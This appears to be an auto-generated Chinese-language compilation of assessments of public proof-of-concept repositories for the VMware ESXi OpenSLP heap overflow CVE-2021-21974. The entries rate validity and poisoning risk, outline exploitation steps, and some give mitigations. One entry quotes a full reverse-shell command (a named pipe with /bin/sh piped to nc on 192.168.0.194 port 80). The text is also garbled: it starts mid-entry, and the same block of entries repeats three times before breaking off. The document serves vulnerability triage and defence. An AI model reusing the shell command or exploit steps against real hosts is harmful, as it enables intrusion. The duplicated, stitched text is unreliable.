2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
